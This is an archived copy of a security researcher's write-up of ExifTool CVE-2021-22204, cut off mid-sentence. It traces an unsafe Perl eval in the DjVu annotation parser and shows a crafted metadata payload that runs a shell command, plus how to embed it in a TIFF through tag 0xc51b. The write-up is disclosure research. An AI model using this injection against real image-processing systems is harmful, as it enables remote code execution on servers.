<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">Original</a>
    <h1>ExifTool CVE-2021-22204 – Arbitrary Code Execution (2021)</h1>
    
    <div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <h2 id="background">Background</h2>

<p>While looking at one of my <a href="http://hackerone.com/gitlab">favourite bug bounty programs</a>, I noticed they were using <a href="https://exiftool.org/">ExifTool</a> to strip tags from uploaded images. I’d used ExifTool numerous times in the past but didn’t even know what language it was written in. An older version was being used (11.70), so I thought maybe there could be some existing CVEs that could be abused, as parsing file formats is hard.</p>

<p>A quick search showed only one old CVE from 2018, so decided to look at the source instead. It turns out that it is written in Perl! I’ve never really used or reviewed Perl code before, but being a dynamic scripting language the majority of the general concepts were familiar.</p>

<p>I started looking for places that performed file access but without much success. I then looked for places that called <code>eval</code>, and it turned out that it was used a lot:
<img src="https://jvns.ca/assets/exiftool/eval.jpg" alt="eval search"/></p>

<p>In Perl, <code>eval</code> can be used with a <a href="https://perldoc.perl.org/functions/eval#eval-BLOCK">block to trap exceptions</a> which is why it was being used everywhere. Ignoring all the eval blocks, there were still a fair few interesting results. One of these was located in the <code>ParseAnt</code> method of the <a href="https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/DjVu.pm#L233">DjVu module</a>:</p>

<div><div><pre><code><span>#------------------------------------------------------------------------------</span>
<span># Parse DjVu annotation &#34;s-expression&#34; syntax (recursively)</span>
<span># Inputs: 0) data ref (with pos($$dataPt) set to start of annotation)</span>
<span># Returns: reference to list of tokens/references, or undef if no tokens,</span>
<span>#          and the position in $$dataPt is set to end of last token</span>
<span># Notes: The DjVu annotation syntax is not well documented, so I make</span>
<span>#        a number of assumptions here!</span>
<span>sub </span><span>ParseAnt</span><span>($)</span>
<span>{</span>
    <span>my</span> <span>$dataPt</span> <span>=</span> <span>shift</span><span>;</span>
    <span>my</span> <span>(</span><span>@toks</span><span>,</span> <span>$tok</span><span>,</span> <span>$more</span><span>);</span>
    <span># (the DjVu annotation syntax really sucks, and requires that every</span>
    <span># single token be parsed in order to properly scan through the items)</span>
<span>Tok:</span> <span>for</span> <span>(;;)</span> <span>{</span>
        <span># find the next token</span>
        <span>last</span> <span>unless</span> <span>$$dataPt</span> <span>=~</span> <span>/(\S)/sg</span><span>;</span>   <span># get next non-space character</span>
        <span>if</span> <span>(</span><span>$</span><span>1</span> <span>eq</span> <span>&#39;</span><span>(</span><span>&#39;)</span> <span>{</span>       <span># start of list</span>
            <span>$tok</span> <span>=</span> <span>ParseAnt</span><span>(</span><span>$dataPt</span><span>);</span>
        <span>}</span> <span>elsif</span> <span>(</span><span>$</span><span>1</span> <span>eq</span> <span>&#39;</span><span>)</span><span>&#39;)</span> <span>{</span>  <span># end of list</span>
            <span>$more</span> <span>=</span> <span>1</span><span>;</span>
            <span>last</span><span>;</span>
        <span>}</span> <span>elsif</span> <span>(</span><span>$</span><span>1</span> <span>eq</span> <span>&#39;</span><span>&#34;</span><span>&#39;)</span> <span>{</span>  <span># quoted string</span>
            <span>$tok</span> <span>=</span> <span>&#39;&#39;;</span>
            <span>for</span> <span>(;;)</span> <span>{</span>
                <span># get string up to the next quotation mark</span>
                <span># this doesn&#39;t work in perl 5.6.2! grrrr</span>
                <span># last Tok unless $$dataPt =~ /(.*?)&#34;/sg;</span>
                <span># $tok .= $1;</span>
                <span>my</span> <span>$pos</span> <span>=</span> <span>pos</span><span>(</span><span>$$dataPt</span><span>);</span>
                <span>last</span> <span>Tok</span> <span>unless</span> <span>$$dataPt</span> <span>=~</span> <span>/&#34;/sg</span><span>;</span>
                <span>$tok</span> <span>.=</span> <span>substr</span><span>(</span><span>$$dataPt</span><span>,</span> <span>$pos</span><span>,</span> <span>pos</span><span>(</span><span>$$dataPt</span><span>)</span><span>-</span><span>1</span><span>-</span><span>$pos</span><span>);</span>
                <span># we&#39;re good unless quote was escaped by odd number of backslashes</span>
                <span>last</span> <span>unless</span> <span>$tok</span> <span>=~</span> <span>/(\\+)$/</span> <span>and</span> <span>length</span><span>(</span><span>$</span><span>1</span><span>)</span> <span>&amp;</span> <span>0x01</span><span>;</span>
                <span>$tok</span> <span>.=</span> <span>&#39;</span><span>&#34;</span><span>&#39;;</span>    <span># quote is part of the string</span>
            <span>}</span>
            <span># must protect unescaped &#34;$&#34; and &#34;@&#34; symbols, and &#34;\&#34; at end of string</span>
            <span>$tok</span> <span>=~</span> <span>s{\\(.)|([\$\@]|\\$)}{&#39;\\&#39;.($2 || $1)}sge</span><span>;</span>
            <span># convert C escape sequences (allowed in quoted text)</span>
            <span>$tok</span> <span>=</span> <span>eval</span> <span>qq{&#34;$tok&#34;}</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>                <span># key name</span>
            <span>pos</span><span>(</span><span>$$dataPt</span><span>)</span> <span>=</span> <span>pos</span><span>(</span><span>$$dataPt</span><span>)</span> <span>-</span> <span>1</span><span>;</span>
            <span># allow anything in key but whitespace, braces and double quotes</span>
            <span># (this is one of those assumptions I mentioned)</span>
            <span>$tok</span> <span>=</span> <span>$$dataPt</span> <span>=~</span> <span>/([^\s()&#34;]+)/sg</span> <span>?</span> <span>$</span><span>1</span> <span>:</span> <span>undef</span><span>;</span>
        <span>}</span>
        <span>push</span> <span>@toks</span><span>,</span> <span>$tok</span> <span>if</span> <span>defined</span> <span>$tok</span><span>;</span>
    <span>}</span>
    <span># prevent further parsing unless more after this</span>
    <span>pos</span><span>(</span><span>$$dataPt</span><span>)</span> <span>=</span> <span>length</span> <span>$$dataPt</span> <span>unless</span> <span>$more</span><span>;</span>
    <span>return</span> <span>@toks</span> <span>?</span> <span>\</span><span>@toks</span> <span>:</span> <span>undef</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>I had no idea what a <code>DjVu</code> file was, but the <code>ParseAnt</code> method was fairly well commented. The block that contained the eval was when the current match was a quote:</p>

<div><div><pre><code>  <span>$tok</span> <span>=</span> <span>&#39;&#39;;</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
      <span># get string up to the next quotation mark</span>
      <span># this doesn&#39;t work in perl 5.6.2! grrrr</span>
      <span># last Tok unless $$dataPt =~ /(.*?)&#34;/sg;</span>
      <span># $tok .= $1;</span>
      <span>my</span> <span>$pos</span> <span>=</span> <span>pos</span><span>(</span><span>$$dataPt</span><span>);</span>
      <span>last</span> <span>Tok</span> <span>unless</span> <span>$$dataPt</span> <span>=~</span> <span>/&#34;/sg</span><span>;</span>
      <span>$tok</span> <span>.=</span> <span>substr</span><span>(</span><span>$$dataPt</span><span>,</span> <span>$pos</span><span>,</span> <span>pos</span><span>(</span><span>$$dataPt</span><span>)</span><span>-</span><span>1</span><span>-</span><span>$pos</span><span>);</span>
      <span># we&#39;re good unless quote was escaped by odd number of backslashes</span>
      <span>last</span> <span>unless</span> <span>$tok</span> <span>=~</span> <span>/(\\+)$/</span> <span>and</span> <span>length</span><span>(</span><span>$</span><span>1</span><span>)</span> <span>&amp;</span> <span>0x01</span><span>;</span>
      <span>$tok</span> <span>.=</span> <span>&#39;</span><span>&#34;</span><span>&#39;;</span>    <span># quote is part of the string</span>
  <span>}</span>
  <span># must protect unescaped &#34;$&#34; and &#34;@&#34; symbols, and &#34;\&#34; at end of string</span>
  <span>$tok</span> <span>=~</span> <span>s{\\(.)|([\$\@]|\\$)}{&#39;\\&#39;.($2 || $1)}sge</span><span>;</span>
  <span># convert C escape sequences (allowed in quoted text)</span>
  <span>$tok</span> <span>=</span> <span>eval</span> <span>qq{&#34;$tok&#34;}</span><span>;</span>
</code></pre></div></div>

<p>It would build up a string until another quote was found, taking into account quotes escaped with a backslash. There was then some regex to escape special characters before passing it quoted to <a href="https://perldoc.perl.org/perlop#qq/STRING/">qq</a> and then finally passing the result to <code>eval</code>. From the comments, this was done to support C escape sequences, which I guess are similar in Perl. The special characters being escaped were trying to prevent any string interpolation or breaking out of the double quotes when the eval was run.</p>

<p>To try out a few things, I wanted to be able to hit the <code>ParseAnt</code> from an image. Luckily there was an <a href="https://github.com/exiftool/exiftool/blob/12.23/t/images/DjVu.djvu">example DjVu.djvu</a> image, but unfortunately, it was using the compressed version of the chunk <code>ANTz</code> instead of the text <code>ANTa</code>.</p>

<p>Looking at the file in a hex editor, the format seemed fairly simple. There was the string <code>DJVIANTz</code> followed by the hex <code>000002E0</code>. Since that corresponded to the remaining number of bytes in the file, it was most likely the length of the tag. I added a <code>print($$dataPt);</code> to the <code>ProcessAnt</code> method and ran exiftool on the djvu image and the following was printed out:</p>

<div><div><pre><code>(metadata
        (Author &#34;Phil Harvey&#34;)
        (Title &#34;DjVu Metadata Sample&#34;)
        (Subject &#34;ExifTool DjVu test image&#34;)
        (Creator &#34;ExifTool&#34;)
        (CreationDate &#34;2008-09-23T12:31:34-04:00&#34;)
        (ModDate &#34;2008-11-11T09:17:10-05:00&#34;)
        (Keywords &#34;ExifTool, Test, DjVu, XMP&#34;)
        (Producer &#34;djvused&#34;)
        (note &#34;Must escape double quotes (\&#34;) and backslashes (\\)&#34;)
        (Trapped &#34;Unknown&#34;)
        (annote &#34;Did you get this?&#34;)
        (url &#34;https://exiftool.org/&#34;) )
(xmp &#34;&lt;rdf:RDF xmlns:rdf=&#39;http://www.w3.org/1999/02/22-rdf-syntax-ns#&#39;&gt;\n\n &lt;rdf:Description rdf:about=&#39;&#39;\n  xmlns:album=\&#34;http://ns.adobe.com/album/1.0/\&#34;&gt;\n  &lt;album:Notes&gt;Must escape double quotes (&amp;quot;) and backslashes (\\)&lt;/album:Notes&gt;\n &lt;/rdf:Description&gt;\n\n &lt;rdf:Description rdf:about=&#39;&#39;\n  xmlns:dc=&#39;http://purl.org/dc/elements/1.1/&#39;&gt;\n  &lt;dc:creator&gt;\n   &lt;rdf:Seq&gt;\n    &lt;rdf:li&gt;Phil Harvey&lt;/rdf:li&gt;\n   &lt;/rdf:Seq&gt;\n  &lt;/dc:creator&gt;\n  &lt;dc:description&gt;\n   &lt;rdf:Alt&gt;\n    &lt;rdf:li xml:lang=&#39;x-default&#39;&gt;ExifTool DjVu test image&lt;/rdf:li&gt;\n   &lt;/rdf:Alt&gt;\n  &lt;/dc:description&gt;\n  &lt;dc:rights&gt;\n   &lt;rdf:Alt&gt;\n    &lt;rdf:li xml:lang=&#39;x-default&#39;&gt;Copyright 2008 Phil Harvey&lt;/rdf:li&gt;\n   &lt;/rdf:Alt&gt;\n  &lt;/dc:rights&gt;\n  &lt;dc:subject&gt;\n   &lt;rdf:Bag&gt;\n    &lt;rdf:li&gt;ExifTool&lt;/rdf:li&gt;\n    &lt;rdf:li&gt;Test&lt;/rdf:li&gt;\n    &lt;rdf:li&gt;DjVu&lt;/rdf:li&gt;\n    &lt;rdf:li&gt;XMP&lt;/rdf:li&gt;\n   &lt;/rdf:Bag&gt;\n  &lt;/dc:subject&gt;\n  &lt;dc:title&gt;\n   &lt;rdf:Alt&gt;\n    &lt;rdf:li xml:lang=&#39;x-default&#39;&gt;DjVu Metadata Sample&lt;/rdf:li&gt;\n   &lt;/rdf:Alt&gt;\n  &lt;/dc:title&gt;\n &lt;/rdf:Description&gt;\n\n &lt;rdf:Description rdf:about=&#39;&#39;\n  xmlns:pdf=&#39;http://ns.adobe.com/pdf/1.3/&#39;&gt;\n  &lt;pdf:Keywords&gt;ExifTool, Test, DjVu, XMP&lt;/pdf:Keywords&gt;\n  &lt;pdf:Producer&gt;djvused&lt;/pdf:Producer&gt;\n  &lt;pdf:Trapped&gt;/Unknown&lt;/pdf:Trapped&gt;\n &lt;/rdf:Description&gt;\n\n &lt;rdf:Description rdf:about=&#39;&#39;\n  xmlns:xmp=&#39;http://ns.adobe.com/xap/1.0/&#39;&gt;\n  &lt;xmp:CreateDate&gt;2008-09-23T12:31:34-04:00&lt;/xmp:CreateDate&gt;\n  &lt;xmp:CreatorTool&gt;ExifTool&lt;/xmp:CreatorTool&gt;\n  &lt;xmp:ModifyDate&gt;2008-11-11T09:17:10-05:00&lt;/xmp:ModifyDate&gt;\n &lt;/rdf:Description&gt;\n&lt;/rdf:RDF&gt;&#34;)

&lt;snip&gt;

Author                          : Phil Harvey
Create Date                     : 2008:09:23 12:31:34-04:00
Modify Date                     : 2008:11:11 09:17:10-05:00
Keywords                        : ExifTool, Test, DjVu, XMP
</code></pre></div></div>

<p>So the metadata format seems to be bracket indented starting with <code>metadata</code> and followed by tag name and quoted value pairs. I edited the file replacing the <code>DJVIANTz...</code> block with <code>DJVIANTa\x00\x00\x00!(metadata (Author &#34;Phil Harvey&#34;))</code>, re-ran exiftool, and the author tag was extracted and displayed!</p>

<h2 id="the-bug">The Bug</h2>

<p>Now I had a way that I could quickly test different combinations, which I combined by adding more <code>print</code> lines to display each time the <code>$tok</code> was modified. I was testing different combinations of new lines and backslashes when the following error was shown:</p>

<div><div><pre><code>String found where operator expected at (eval 8) line 2, at end of line
        (Missing semicolon on previous line?)
</code></pre></div></div>

<p>I had used a backslash followed by a newline then a double quote which hard resulted in the following being evaled:</p>



<p>The second quote was not escaped because in the regex <code>$tok =~ /(\\+)$/</code> the <code>$</code> will match the end of a string, but also match <a href="https://perldoc.perl.org/perlre#Metacharacters">before a newline at the end of a string</a>, so the code thinks that the quote is being escaped when it’s escaping the newline.</p>

<p>This was pretty exciting as all that was needed was to make it valid Perl and it would be evaled! I change the metadata to comment out the trailing quote and execute and return <code>date</code>:</p>

<div><div><pre><code>(metadata
    (Author &#34;\
&#34; . return `date`; #&#34;)
)
</code></pre></div></div>

<p>Running exiftool on the new image resulting in code execution!</p>

<div><div><pre><code>ExifTool Version Number         : 12.23
File Name                       : DjVu.djvu
File Size                       : 376 bytes
File Modification Date/Time     : 2021:05:04 22:50:09+10:00
File Access Date/Time           : 2021:05:04 22:50:09+10:00
File Inode Change Date/Time     : 2021:05:04 22:50:09+10:00
File Permissions                : -rw-r--r--
File Type                       : DJVU (multi-page)
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Subfile Type                    : Single-page image
Image Width                     : 8
Image Height                    : 8
DjVu Version                    : 0.24
Spatial Resolution              : 100
Gamma                           : 2.2
Orientation                     : Unknown (0)
Included File ID                : shared_anno.iff
Author                          : Tue  4 May 2021 22:51:12 AEST.
Image Size                      : 8x8
Megapixels                      : 0.000064
</code></pre></div></div>

<h2 id="additional-formats">Additional Formats</h2>

<p>Having code execution by just passing an unknown file to ExifTool was pretty amazing, but what would be even better was if the bug could be trigged with a valid image in a more common format. That way even if some validation was performed on the image before being passed to ExifTool (for example ensuring that it’s a png or jpeg) then it would still work.</p>

<p>I started looking to see if anything else used the <code>DjVu</code> module, but it was only referenced by the <code>AIFF</code> module and no other formats referenced that one. I remembered that ExifTool could be used to embed and extract jpeg thumbnails, but looking where <code>ThumbnailImage</code> was used it didn’t seem to try and parse the embedded image.</p>

<p>That lead me to look for functions that did parse the image metadata:</p>

<div><div><pre><code><span>#------------------------------------------------------------------------------</span>
<span># Extract meta information from image</span>
<span># Inputs: 0) ExifTool object reference</span>
<span>#         1-N) Same as ImageInfo()</span>
<span># Returns: 1 if this was a valid image, 0 otherwise</span>
<span># Notes: pass an undefined value to avoid parsing arguments</span>
<span># Internal &#39;ReEntry&#39; option allows this routine to be called recursively</span>
<span>sub </span><span>ExtractInfo</span><span>($</span><span>;</span><span>@</span><span>)</span>
</code></pre></div></div>

<p>Interestingly the comment mentioned that this could be called recursively if the <code>ReEntry</code> option was specified. Looking at where <code>ExtractInfo</code> was being used lead me to the <a href="https://github.com/exiftool/exiftool/blob/12.23/lib/Image/ExifTool/Exif.pm#L3004">Exif module</a>:</p>

<div><div><pre><code><span>%</span><span>Image::ExifTool::Exif::</span><span>Main</span> <span>=</span> <span>(</span>
  <span># SNIP</span>

  <span>0xc51b</span> <span>=&gt;</span> <span>{</span> <span># (Hasselblad H3D)</span>
        <span>Name</span> <span>=&gt;</span> <span>&#39;</span><span>HasselbladExif</span><span>&#39;,</span>
        <span>Format</span> <span>=&gt;</span> <span>&#39;</span><span>undef</span><span>&#39;,</span>
        <span>RawConv</span> <span>=&gt;</span> <span>q{
            $$self{DOC_NUM} = ++$$self{DOC_COUNT};
            $self-&gt;ExtractInfo(\$val, { ReEntry =&gt; 1 });
            $$self{DOC_NUM} = 0;
            return undef;
        }</span><span>,</span>
    <span>},</span>
</code></pre></div></div>

<p>So if the EXIF tag <code>0xc51b</code> was found, the value would be passed to <code>ExtractInfo</code> and the metadata would be parsed, allowing the DjVu bug to be hit! The description at the top of the Exif module was <code>Read EXIF/TIFF meta information</code>, so I started reading about the <a href="https://www.fileformat.info/format/tiff/egff.htm">TIFF format</a>.</p>

<p>There was a sample tif in the test files, and running exiftools with <code>-v10</code> was very helpful:</p>

<div><div><pre><code>exiftool <span>-v10</span> ./t/images/ExifTool.tif
  ExifToolVersion <span>=</span> 11.85
  FileName <span>=</span> ExifTool.tif
  Directory <span>=</span> ./t/images
  FileSize <span>=</span> 4864
  FileModifyDate <span>=</span> 1618544560
  FileAccessDate <span>=</span> 1618544564
  FileInodeChangeDate <span>=</span> 1618974185
  FilePermissions <span>=</span> 33188
  FileType <span>=</span> TIFF
  FileTypeExtension <span>=</span> TIF
  MIMEType <span>=</span> image/tiff
  ExifByteOrder <span>=</span> MM
  + <span>[</span>IFD0 directory with 22 entries]
  | 0<span>)</span>  SubfileType <span>=</span> 0
  |     - Tag 0x00fe <span>(</span>4 bytes, int32u[1]<span>)</span>:
  |         0012: 00 00 00 00                                     <span>[</span>....]
  | 1<span>)</span>  ImageWidth <span>=</span> 160
  |     - Tag 0x0100 <span>(</span>4 bytes, int32u[1]<span>)</span>:
  |         001e: 00 00 00 a0                                     <span>[</span>....]
  | 2<span>)</span>  ImageHeight <span>=</span> 120
  |     - Tag 0x0101 <span>(</span>4 bytes, int32u[1]<span>)</span>:
  |         002a: 00 00 00 78                                     <span>[</span>...x]
  | 3<span>)</span>  BitsPerSample <span>=</span> 8 8 8
  |     - Tag 0x0102 <span>(</span>6 bytes, int16u[3]<span>)</span>:
  |         0116: 00 08 00 08 00 08                               <span>[</span>......]
  | 4<span>)</span>  Compression <span>=</span> 5
  |     - Tag 0x0103 <span>(</span>2 bytes, int16u[1]<span>)</span>:
  |         0042: 00 05                                           <span>[</span>..]
  | 5<span>)</span>  PhotometricInterpretation <span>=</span> 2
  |     - Tag 0x0106 <span>(</span>2 bytes, int16u[1]<span>)</span>:
  |         004e: 00 02                                           <span>[</span>..]
  | 6<span>)</span>  ImageDescription <span>=</span> The picture caption
  |     - Tag 0x010e <span>(</span>20 bytes, string[20]<span>)</span>:
  |         011c: 54 68 65 20 70 69 63 74 75 72 65 20 63 61 70 74 <span>[</span>The picture capt]
  |         012c: 69 6f 6e 00                                     <span>[</span>ion.]
  | 7<span>)</span>  Make <span>=</span> Canon
  |     - Tag 0x010f <span>(</span>6 bytes, string[6]<span>)</span>:
  |         0130: 43 61 6e 6f 6e 00                               <span>[</span>Canon.]
  | 8<span>)</span>  Model <span>=</span> Canon EOS DIGITAL REBEL
  |     - Tag 0x0110 <span>(</span>24 bytes, string[24]<span>)</span>:
  |         0136: 43 61 6e 6f 6e 20 45 4f 53 20 44 49 47 49 54 41 <span>[</span>Canon EOS DIGITA]
  |         0146: 4c 20 52 45 42 45 4c 00                         <span>[</span>L REBEL.]
  | 9<span>)</span>  StripOffsets <span>=</span> 3816
  |     - Tag 0x0111 <span>(</span>4 bytes, int32u[1]<span>)</span>:
  |         007e: 00 00 0e e8                                     <span>[</span>....]
  | 10<span>)</span> SamplesPerPixel <span>=</span> 3
  |     - Tag 0x0115 <span>(</span>2 bytes, int16u[1]<span>)</span>:
  |         008a: 00 03                                           <span>[</span>..]
  | 11<span>)</span> RowsPerStrip <span>=</span> 120
  |     - Tag 0x0116 <span>(</span>4 bytes, int32u[1]<span>)</span>:
  |         0096: 00 00 00 78                                     <span>[</span>...x]
  | 12<span>)</span> StripByteCounts <span>=</span> 1048
  |     - Tag 0x0117 <span>(</span>4 bytes, int32u[1]<span>)</span>:
  |         00a2: 00 00 04 18                                     <span>[</span>....]
  | 13<span>)</span> XResolution <span>=</span> 180 <span>(</span>1800/10<span>)</span>
  |     - Tag 0x011a <span>(</span>8 bytes, rational64u[1]<span>)</span>:
  |         014e: 00 00 07 08 00 00 00 0a                         <span>[</span>........]
  | 14<span>)</span> YResolution <span>=</span> 180 <span>(</span>1800/10<span>)</span>
  |     - Tag 0x011b <span>(</span>8 bytes, rational64u[1]<span>)</span>:
  |         0156: 00 00 07 08 00 00 00 0a                         <span>[</span>........]
  | 15<span>)</span> PlanarConfiguration <span>=</span> 1
  |     - Tag 0x011c <span>(</span>2 bytes, int16u[1]<span>)</span>:
  |         00c6: 00 01                                           <span>[</span>..]
  | 16<span>)</span> ResolutionUnit <span>=</span> 2
  |     - Tag 0x0128 <span>(</span>2 bytes, int16u[1]<span>)</span>:
  |         00d2: 00 02                                           <span>[</span>..]
  | 17<span>)</span> Software <span>=</span> GraphicConverter
  |     - Tag 0x0131 <span>(</span>17 bytes, string[17]<span>)</span>:
  |         015e: 47 72 61 70 68 69 63 43 6f 6e 76 65 72 74 65 72 <span>[</span>GraphicConverter]
  |         016e: 00                                              <span>[</span>.]
  | 18<span>)</span> ModifyDate <span>=</span> 2004:02:20 08:07:49
  |     - Tag 0x0132 <span>(</span>20 bytes, string[20]<span>)</span>:
  |         0170: 32 30 30 34 3a 30 32 3a 32 30 20 30 38 3a 30 37 <span>[</span>2004:02:20 08:07]
  |         0180: 3a 34 39 00                                     <span>[</span>:49.]
  | 19<span>)</span> Predictor <span>=</span> 1
  |     - Tag 0x013d <span>(</span>2 bytes, int16u[1]<span>)</span>:
  |         00f6: 00 01                                           <span>[</span>..]
  | 20<span>)</span> IPTC-NAA <span>(</span>SubDirectory<span>)</span> <span>--</span><span>&gt;</span>
  |     - Tag 0x83bb <span>(</span>284 bytes, int32u[71] <span>read </span>as undef[284]<span>)</span>:
  |         0184: 1c 02 00 00 02 00 02 1c 02 78 00 13 54 68 65 20 <span>[</span>.........x..The <span>]</span>
  |         0194: 70 69 63 74 75 72 65 20 63 61 70 74 69 6f 6e 1c <span>[</span>picture caption.]
  |         01a4: 02 7a 00 0a 49 20 77 72 6f 74 65 20 69 74 1c 02 <span>[</span>.z..I wrote it..]
  |         01b4: 28 00 0f 6e 6f 20 69 6e 73 74 72 75 63 74 69 6f <span>[(</span>..no instructio]
  |         01c4: 6e 73 1c 02 50 00 0e 49 27 6d 20 74 68 65 20 61 <span>[</span>ns..P..I<span>&#39;m the a]
  |         01d4: 75 74 68 6f 72 1c 02 55 00 06 4f 6e 20 74 6f 70 [uthor..U..On top]
  |         01e4: 1c 02 6e 00 0b 50 68 69 6c 20 48 61 72 76 65 79 [..n..Phil Harvey]
  |         01f4: 1c 02 73 00 09 4d 79 20 63 61 6d 65 72 61 1c 02 [..s..My camera..]
  |         0204: 05 00 11 54 68 69 73 20 69 73 20 74 68 65 20 74 [...This is the t]
  |         0214: 69 74 6c 65 1c 02 37 00 08 32 30 30 34 30 32 32 [itle..7..2004022]
  |         0224: 30 1c 02 5a 00 08 4b 69 6e 67 73 74 6f 6e 1c 02 [0..Z..Kingston..]
  |         0234: 5f 00 07 4f 6e 74 61 72 69 6f 1c 02 65 00 06 43 [_..Ontario..e..C]
  |         0244: 61 6e 61 64 61 1c 02 67 00 0c 6e 6f 20 72 65 66 [anada..g..no ref]
  |         0254: 65 72 65 6e 63 65 1c 02 19 00 08 65 78 69 66 74 [erence.....exift]
  |         0264: 6f 6f 6c 1c 02 19 00 04 74 65 73 74 1c 02 19 00 [ool.....test....]
  |         0274: 07 70 69 63 74 75 72 65 1c 02 74 00 10 43 6f 70 [.picture..t..Cop]
  |         0284: 79 72 69 67 68 74 20 6e 6f 74 69 63 65 1c 02 69 [yright notice..i]
  |         0294: 00 08 68 65 61 64 6c 69 6e 65 00 00             [..headline..]
  | + [IPTC directory, 284 bytes]
  ...
</span></code></pre></div></div>

<p>Opening the file in a hex editor and searching for the tag id <code>83BB</code> found the following sequence <code>83BB00040000004700000184</code>. Referring to format doc this should match up with the tif tag:</p>

<div><div><pre><code><span>typedef</span> <span>struct</span> <span>_TifTag</span>
<span>{</span>
	<span>WORD</span>   <span>TagId</span><span>;</span>       <span>/* The tag identifier  */</span>
	<span>WORD</span>   <span>DataType</span><span>;</span>    <span>/* The scalar type of the data items  */</span>
	<span>DWORD</span>  <span>DataCount</span><span>;</span>   <span>/* The number of items in the tag data  */</span>
	<span>DWORD</span>  <span>DataOffset</span><span>;</span>  <span>/* The byte offset to the data items  */</span>
<span>}</span> <span>TIFTAG</span><span>;</span>
</code></pre></div></div>

<p>So the tag id is 0x83BB, the datatype is 4, the count is 0x47 (71) and the offset 0x184 (388). The data type of 4 is a <code>32-bit unsigned integer</code>, which all fits with the information provided by the verbose output. Simply changing <code>0x83BB</code> to <code>0xC51B</code> and rerunning exiftool had it picking up the <code>HasselbladExif</code> tag! I then replaced the whole tag value with a short payload that would trigger the eval:</p>

<div><div><pre><code>$ exiftool -v10 ./t/images/ExifTool.tif
...
  | 19) Predictor = 1
  |     - Tag 0x013d (2 bytes, int16u[1]):
  |         00f6: 00 01                                           [..]
  | 20) HasselbladExif = AT&amp;TFORM.DJVUANTa..(metadata.    (Author &#34;\.&#34; . return `date`; #&#34;)
  |     - Tag 0xc51b (284 bytes, int32u[71] read as undef[284]):
  |         0184: 41 54 26 54 46 4f 52 4d 00 00 00 08 44 4a 56 55 [AT&amp;TFORM....DJVU]
  |         0194: 41 4e 54 61 00 00 01 04 28 6d 65 74 61 64 61 74 [ANTa....(metadat]
  |         01a4: 61 0a 20 20 20 20 28 41 75 74 68 6f 72 20 22 5c [a.    (Author &#34;\]
  |         01b4: 0a 22 20 2e 20 72 65 74 75 72 6e 20 60 64 61 74 [.&#34; . return `dat]
  |         01c4: 65 60 3b 20 23 22 29 20 20 20 20 20 20 20 20 20 [e`; #&#34;)         ]
  |         01d4: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         01e4: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         01f4: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0204: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0214: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0224: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0234: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0244: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0254: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0264: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0274: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0284: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |         0294: 20 20 20 20 20 20 20 20 20 20 20 20             [            ]
  | FileType = DJVU
  | FileTypeExtension = DJVU
  | MIMEType = image/vnd.djvu
AIFF &#39;ANTa&#39; chunk (260 bytes of data): 24
  | ANTa (SubDirectory) --&gt;
  | - Tag &#39;ANTa&#39; (260 bytes):
  |     0018: 28 6d 65 74 61 64 61 74 61 0a 20 20 20 20 28 41 [(metadata.    (A]
  |     0028: 75 74 68 6f 72 20 22 5c 0a 22 20 2e 20 72 65 74 [uthor &#34;\.&#34; . ret]
  |     0038: 75 72 6e 20 60 64 61 74 65 60 3b 20 23 22 29 20 [urn `date`; #&#34;) ]
  |     0048: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0058: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0068: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0078: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0088: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0098: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     00a8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     00b8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     00c8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     00d8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     00e8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     00f8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0108: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
  |     0118: 20 20 20 20                                     [    ]
  | | Metadata (SubDirectory) --&gt;
  | | + [Metadata directory with 1 entries]
  | | | Author = Thu  6 May 2021 21:06:17 AEST.
</code></pre></div></div>

<p>Great so now the payload could be triggered from a valid tif! What’s more, the EXIF data is used in quite a few other formats:</p>

<div><div><pre><code>EXIF stands for &#34;Exchangeable Image File Format&#34;.  This type of information
is formatted according to the TIFF specification, and may be found in JPG,
